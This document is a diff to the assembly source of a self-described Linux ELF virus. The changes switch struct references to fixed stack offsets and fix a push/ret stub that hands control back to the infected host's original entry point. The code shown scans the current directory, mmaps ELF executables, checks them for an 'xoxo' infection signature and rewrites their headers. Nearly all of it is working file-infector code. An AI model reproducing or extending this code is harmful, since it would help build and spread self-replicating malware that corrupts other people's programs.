@@ -143,31 +143,31 @@ BITS 64
 ;*******************************************************************************
 
 section	.bss
-	struc linuxdirent
-		.d_ino:			resq	1
-		.d_off:			resq	1
-		.d_reclen:		resb	2
-		.d_nameq:		resb	1
-		.d_type:		resb	1
-	endstruc
-	
-	struc filestat
-		.st_dev			resq	1	;IDofdevcontainingfile
-		.st_ino			resq	1	;inode#
-		.st_mode		resd	1	;pn
-		.st_nlink		resd	1	;#ofhardlinks
-		.st_uid			resd	1	;useridofowner
-		.st_gid			resd	1	;groupIdofowner
-		.st_rdev		resq	1	;devID
-		.st_pad1		resq	1	;padding
-		.st_size		resd	1	;totalsizeinbytes
-		.st_blksize		resq	1	;blocksizeforfsi/o
-		.st_pad2		resd	1	;padding
-		.st_blocks		resq	1	;#of512bblocksallocated
-		.st_atime		resq	1	;timeoflastfileaccess
-		.st_mtime		resq	1	;timeoflastfilemod
-		.st_ctime		resq	1	;timeoflastfilestatuschange
-	endstruc
+;	struc linuxdirent
+;		.d_ino:			resq	1
+;		.d_off:			resq	1
+;		.d_reclen:		resb	2
+;		.d_nameq:		resb	1
+;		.d_type:		resb	1
+;	endstruc
+;	
+;	struc filestat
+;		.st_dev			resq	1	;IDofdevcontainingfile
+;		.st_ino			resq	1	;inode#
+;		.st_mode		resd	1	;pn
+;		.st_nlink		resd	1	;#ofhardlinks
+;		.st_uid			resd	1	;useridofowner
+;		.st_gid			resd	1	;groupIdofowner
+;		.st_rdev		resq	1	;devID
+;		.st_pad1		resq	1	;padding
+;		.st_size		resd	1	;totalsizeinbytes
+;		.st_blksize		resq	1	;blocksizeforfsi/o
+;		.st_pad2		resd	1	;padding
+;		.st_blocks		resq	1	;#of512bblocksallocated
+;		.st_atime		resq	1	;timeoflastfileaccess
+;		.st_mtime		resq	1	;timeoflastfilemod
+;		.st_ctime		resq	1	;timeoflastfilestatuschange
+;	endstruc
 
 	struc elf_ehdr
 		.e_ident		resd	1		;unsignedchar
@@ -217,7 +217,77 @@ section	.bss
      	.sh_entsize		resq 1		; uint64_t   
 	endstruc
 
+;*******************************************************************************
+; stacks on stacks on stacks on I'm doing this bc a .bss section for a virus
+; is a nightmare to deal with
+; so, yw,  I've written out the stack layout 4 u
+; il n'y a plus de cauchemars
+; jtm xoxo
+;*******************************************************************************
+; r14 	 =	struc filestat
+; r14 + 0			.st_dev			resq	1	;IDofdevcontainingfile
+; r14 +	8			.st_ino			resq	1	;inode#
+; r14 + 16			.st_mode		resd	1	;pn
+; r14 + 20			.st_nlink		resd	1	;#ofhardlinks
+; r14 + 24			.st_uid			resd	1	;useridofowner
+; r14 + 28			.st_gid			resd	1	;groupIdofowner
+; r14 + 32			.st_rdev		resq	1	;devID
+; r14 + 40			.st_pad1		resq	1	;padding
+; r14 + 48			.st_size		resd	1	;totalsizeinbytes
+; r14 + 52			.st_blksize		resq	1	;blocksizeforfsi/o
+; r14 + 60			.st_pad2		resd	1	;padding
+; r14 + 68			.st_blocks		resq	1	;#of512bblocksallocated
+; r14 + 76			.st_atime		resq	1	;timeoflastfileaccess
+; r14 + 		.st_mtime		resq	1	;timeoflastfilemod
+; r14 + 		.st_ctime		resq	1	;timeoflastfilestatuschange
+; r14 + 144 end struc
+;
+; instructions for returning to original host ELF entry point
+; after conclusion of vx routines; appended to end of vx body
+; r14 + 150 = push (0x68)
+; r14 + 152 = dword XXXX 		address of original host entry point
+; r14 + 156 = ret (0xc3)
 
+;
+; r14 + 200 = local filename (saved from dirent.d_nameq)
+; r14 + 500 = 
+;
+; r14 + 600 = 	struc linuxdirent
+; r14 + 600			.d_ino:			resq	1
+; r14 + 608			.d_off:			resq	1
+; r14 + 616			.d_reclen:		resb	2
+; r14 + 618			.d_nameq:		resb	1
+; r14 + 619			.d_type:		resb	1
+; r14 + 620		endstruc
+;
+;
+; r14 + 800 = mmap'd copy of host ELF executable to infect
+;
+; r14 + 800 	struc elf_ehdr
+; r14 + 800			.e_ident		resd	1		;unsignedchar
+; r14 + 804			.ei_class		resb	1		;
+; r14 + 805			.ei_data		resb	1		;
+; r14 + 806			.ei_version		resb	1		;
+; r14 + 807			.ei_osabi		resb	1		;
+; r14 + 808			.ei_abiversion	resb	1		;
+; r14 + 809			.ei_padding		resb	6		;bytes9-14
+; r14 + 815			.ei_nident		resb	1		;sizeofidentarray
+; r14 + 816			.e_type			resw	1		;uint16_t,bytes16-17
+; r14 + 818			.e_machine		resw	1		;uint16_t,bytes18-19
+; r14 + 820			.e_version		resd	1		;uint32_t, bytes 20-23
+; r14 + 824			.e_entry		resq	1		;ElfN_Addr, bytes 24-31
+; r14 + 832			.e_phoff		resq	1		;ElfN_Off, bytes 32-39
+; r14 + 840			.e_shoff		resq	1		;ElfN_Off, bytes 40-47
+; r14 + 848			.e_flags		resd	1		;uint32_t, bytes 48-51
+; r14 + 852			.e_ehsize		resb	2		;uint16_t, bytes 52-53
+; r14 + 854			.e_phentsize	resb	2		;uint16_t, bytes 54-55
+; r14 + 856			.e_phnum		resb	2		;uint16_t, bytes 56-57
+; r14 + 858			.e_shentsize	resb	2		;uint16_t, bytes 58-59
+; r14 + 860			.e_shnum		resb	2		;uint16_t, bytes 60-61
+; r14 + 862			.e_shstrndx		resb	2		;uint16_t, bytes 62-63
+; r14 + 865		endstruc
+;
+;
 
 section .data
 
@@ -341,11 +411,11 @@ O_WRONLY		equ 0x1
 O_RDONLY		equ 0x0
 
 
-O_CREAT			equ 100o
-O_TRUNC			equ 1000o
-O_APPEND		equ 2000o
+;O_CREAT			equ 100o
+;O_TRUNC			equ 1000o
+;O_APPEND		equ 2000o
 
-SEEK_CUR 		equ 0x1
+;SEEK_CUR 		equ 0x1
 
 ;S_IFREG    		dq 0x0100000   ;regular file
 ;S_IFMT 			dq 0x0170000
@@ -427,7 +497,8 @@ get_cwd:
 ;****************************************************************************************
 process_dirents:
 	mov rdi, rax
-	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
+	;lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
+	lea rsi, [r14 + 600] ;r14 + 600 is location on the stack where we'll save our dirent struct
 	mov rdx, MAX_RDENT_BUF_SIZE
 	mov rax, SYS_GETDENTS64
 	syscall
@@ -502,7 +573,8 @@ check_file:
 	push rcx
 	;nvm d_type might not be available; use the macros for fstat instead
 	check_elf:
-		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
+		;lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
+		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename in rdi
 		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
 		xor rdx, rdx						;mode - 0
 		mov rax, SYS_OPEN
@@ -518,7 +590,8 @@ check_file:
 		
 		xor r12, r12
 		lea rdi, [r14 + 200] 
-		lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
+		;lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
+		lea rsi, [rcx + r14 + 618]
 		.copy_filename:
 			movsb
 			inc r12
@@ -563,7 +636,8 @@ check_file:
 		;mov r12, filenamepasslen
 		;call _write
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
-		lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
+		;lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
+		lea rsi, [r14]	;or retrieve size from filestat struct with an fstat syscall
 		mov rdi, r8
 		mov rax, SYS_FSTAT
 		syscall
@@ -587,7 +661,8 @@ check_file:
 		;                  int fd, off_t offset);
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
-		mov rsi, [r14 + filestat.st_size]
+		;mov rsi, [r14 + filestat.st_size]
+		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
 		mov r10, MAP_PRIVATE
 		;mov r8, fd				;fd is already in r8 so we don't need to set that reg again
@@ -658,8 +733,6 @@ check_file:
 		
 	verifie_pas_de_vx_sig:
 		lea r13, [rax + elf_ehdr.e_entry + 2]
-		;mov r12, 5
-		;call _write
 		cmp dword [r13], 0x786f786f
 		je checknext
 	
@@ -682,12 +755,14 @@ check_file:
 		;call _write
 		
 		mov rdi, fd
-		mov rsi, [r14 + filestat.st_size]
+		;mov rsi, [r14 + filestat.st_size]
+		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rax, SYS_MUNMAP
 		syscall
 		
 		pop rcx
-		add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
+		;add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
+		add cx, [rcx + r14 + 616]
 		cmp qword rcx, [r14 + 500]
 		jne check_file
 		jmp _restore
@@ -995,10 +1070,10 @@ frankenstein_elf:
 		syscall
 
 	.write_jmp_to_oep:
-		mov rdx, 6
+		mov rdx, 8
 		mov byte [r14 + 150], 0x68			;0x68 = push
 		mov dword [r14 + 152], r8d			;address of original host entry point
-		mov byte [r14 + 154], 0xc3			;0xc3 = ret
+		mov byte [r14 + 156], 0xc3			;0xc3 = ret
 		lea rsi, [r14+ 150]
 		mov r10, qword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
@@ -1028,7 +1103,8 @@ frankenstein_elf:
 ;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
-		mov rdx, [r14 + filestat.st_size]
+		;mov rdx, [r14 + filestat.st_size]
+		mov rdx, [r14 + 48] 	;filestat.st_size
 		sub edx, dword [oshoff]
 		lea rsi, [r13 + elf_ehdr]
 		add rsi, qword [oshoff]
@@ -1040,7 +1116,8 @@ frankenstein_elf:
 		
 		;munmap file from work area
 		mov rdi, r13
-		mov rsi, [r14 + filestat.st_size]
+		;mov rsi, [r14 + filestat.st_size]
+		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rax, SYS_MUNMAP
 		syscall
 
